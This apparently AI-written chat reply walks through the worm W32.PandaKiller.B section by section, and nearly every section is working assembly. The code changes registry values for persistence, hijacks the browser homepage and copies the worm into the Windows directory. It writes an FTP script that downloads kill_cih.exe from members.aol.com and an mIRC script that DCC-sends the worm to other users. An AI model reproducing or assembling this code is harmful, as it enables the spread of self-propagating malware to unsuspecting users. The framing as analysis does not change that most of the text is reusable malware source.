
Here is the structured analysis of **W32.PandaKiller.B**, illustrating its operations with corresponding assembly code snippets.

----------

## **1. Registry Modification: Changing Registered Owner**

The malware modifies the **Windows registered owner** to `"PandaKiller"`.


```assembly
push offset l
push offset p
push 0
push 1F0000h + 1 + 2h
push 0
push 0
push 0
push offset CLE
push 80000002h                  ; HKEY_LOCAL_MACHINE
call RegCreateKeyExA

push 05h
push offset DONNEE              ; "PandaKiller"
push 01h
push 0
push offset NOM                 ; RegisteredOwner
push p
call RegSetValueExA             ; Modify registry value

push 0
call RegCloseKey                ; Close registry
```

----------

## **2. Self-Copying to %windir%\WinExec.exe**

The malware copies itself to the Windows directory under the name `WinExec.exe`.


```assembly
push 00000000h
call GetModuleHandleA
push 260
push offset moi
push eax
call GetModuleFileNameA

push 260
push offset targ1
call GetWindowsDirectoryA
push offset copie1
push offset targ1
call lstrcat

push 00000000h
push offset targ1
push offset moi
call CopyFileA                  ; Copy itself to %windir%\WinExec.exe
```

----------

## **3. Creating a Directory: C:\Win**

A new directory `C:\Win` is created to store additional malware components.


```assembly
push 00000000h
push offset dossier
call CreateDirectoryA           ; Create C:\Win
```

----------

## **4. Modifying Internet Explorer Homepage**

The malware changes the **Internet Explorer start page** to `"http://kadosh.multimania.com"`.


```assembly
push offset l
push offset p
push 0
push 1F0000h + 1 + 2h
push 0
push 0
push 0
push offset CLE2
push 80000001h                  ; HKEY_CURRENT_USER
call RegCreateKeyExA

push 05h
push offset DONNEE2             ; "http://kadosh.multimania.com"
push 01h
push 0
push offset NOM2                ; Start Page
push p
call RegSetValueExA             ; Modify registry value

push 0
call RegCloseKey                ; Close registry
```

----------

## **5. Adding Persistence in Startup Registry Key**

The malware ensures its execution at startup by adding `C:\Win\kill_cih.exe` to the registry.


```assembly
push offset l
push offset p
push 0
push 1F0000h + 1 + 2h
push 0
push 0
push 0
push offset CLE3
push 80000002h                  ; HKEY_LOCAL_MACHINE
call RegCreateKeyExA

push 05h
push offset DONNEE3             ; "C:\Win\kill_cih.exe"
push 01h
push 0
push offset NOM3                ; killcih
push p
call RegSetValueExA             ; Modify registry value

push 0
call RegCloseKey                ; Close registry
```

----------

## **6. Creating Files for FTP and mIRC Auto-Spreading**

The malware creates three files in `C:\Win`:

-   **FTP.DRV**: Used to connect to an FTP server and download `kill_cih.exe`.
-   **FTP.BAT**: Executes `FTP.DRV`.
-   **MIRC.EKP**: A script for mIRC to propagate the malware.

### **Creating FTP.BAT**


```assembly
push 00000000h
push 00000080h
push 00000002h
push 00000000h
push 00000001h
push 40000000h
push offset bat
call CreateFileA

mov  [fh],eax
push 00h
push offset octets
push batsize
push offset batd
push [fh]
call WriteFile

push [fh]
call CloseHandle
```

**Content of FTP.BAT:**

```assembly
batd    db "@echo off",0dh,0ah
        db "start ftp -i -v -s:C:\Win\ftp.drv",00h
```

----------

### **Creating FTP.DRV**

```assembly
push 00000000h
push 00000080h
push 00000002h
push 00000000h
push 00000001h
push 40000000h
push offset drv
call CreateFileA

mov  [fh],eax
push 00h
push offset octets
push drvsize
push offset drvd
push [fh]
call WriteFile

push [fh]
call CloseHandle
```

**Content of FTP.DRV:**

```assembly
drvd    db "open",0dh,0ah
        db "members.aol.com",0dh,0ah
        db "pentasm99",0dh,0ah
        db "cd Panda",0dh,0ah
        db "binary",0dh,0ah
        db "lcd C:\Win",0dh,0ah
        db "get kill_cih.exe",0dh,0ah
        db "bye",0dh,0ah
        db "exit",0dh,0ah
```

----------

### **Creating MIRC.EKP**

```assembly
push 00000000h
push 00000080h
push 00000002h
push 00000000h
push 00000001h
push 40000000h
push offset ini
call CreateFileA

mov  [fh],eax
push 00h
push offset octets
push inisize
push offset inid
push [fh]
call WriteFile

push [fh]
call CloseHandle
```

**Content of MIRC.EKP:**

```assembly
inid    db "[SCRIPT]",0dh,0ah
        db "n1=on 1:start:{",0dh,0ah
        db "n2=.remote on",0dh,0ah
        db "n3=.ctcps on",0dh,0ah
        db "n4=.events on",0dh,0ah
        db "n5=}",0dh,0ah
        db "n6=on 1:connect:{",0dh,0ah
        db "n7= /.copy -0 C:\Windows\WinExec.exe C:\Picture.exe",0dh,0ah
        db "n8= /.run -n C:\command.com start C:\Win\ftp.bat",0dh,0ah
        db "n9=on 1:join:#:{",0dh,0ah
        db "n10=if ( $nick == $ma )  {halt } .dcc send $nick C:\Picture.exe",0dh,0ah
        db "n11=}",0dh,0ah
        db "n12=on 1:text:*worm*:{",0dh,0ah
        db "n13=if ( $nick == $ma )  {halt } .dcc send $nick C:\Picture.exe",0dh,0ah
        db "n14=}",0dh,0ah
        db "n15=on 1:text:*KKK*:/disconnect",0dh,0ah
        db "n16=on 1:text:*white power*:/exit",0dh,0ah
        db "n17=on 1:text:*hitler*:/remove C:\Windows\regedit.exe",0dh,0ah
```

----------

## **7. Executing FTP.BAT and Exiting**

The malware executes the batch script and terminates itself.

assembly

CopyEdit

`WinExecBat:
        push 1
        push offset bat
        call WinExec

FIN:    
        push 0
        call ExitProcess` 

----------

This analysis shows how **W32.PandaKiller.B** spreads through **FTP, mIRC, and registry modifications**, ensuring persistence and network-based propagation. Let me know if you need more details! 🚀
